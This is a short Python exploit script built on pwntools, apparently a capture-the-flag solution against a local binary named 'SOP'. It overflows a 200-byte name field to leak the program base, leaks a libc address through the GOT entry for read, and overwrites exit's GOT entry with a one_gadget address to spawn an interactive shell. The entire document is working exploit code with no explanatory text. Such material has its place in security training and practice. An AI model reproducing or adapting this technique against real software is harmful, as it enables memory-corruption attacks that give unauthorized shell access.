from pwn import *

context.log_level = "debug"
p = process("./SOP")

# leak codebase
p.sendlineafter("Name\n", "A"*200)
p.sendlineafter("choice\n", "1")
p.recvuntil("A"*200)
codebase = u64(p.recvline().strip().ljust(8, "\x00"))-0xbfd
p.success("codebase: "+hex(codebase))

# leak libc
read_got = codebase + 0x202020
p.sendlineafter("choice\n", "2")
p.sendlineafter("Name\n", "A"*200+p64(read_got))
p.sendlineafter("choice\n", "1")
p.recvuntil("Desc: ")
read_libc = u64(p.recvn(6).ljust(8, "\x00"))
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = read_libc - libc.symbols["read"]
log.success("libc: "+hex(libc.address))
magic = libc.address + 0xf1147 # 0xf02a4, 0x4526a, 0x45216

# edit exitt to magic
exit_got = codebase + 0x202040
p.sendlineafter("choice\n", "2")
p.sendlineafter("Name\n", "A"*200+p64(exit_got))
p.sendlineafter("choice\n", "3")
p.sendlineafter("description\n", p64(magic))
p.sendlineafter("choice\n", "4")

p.interactive()
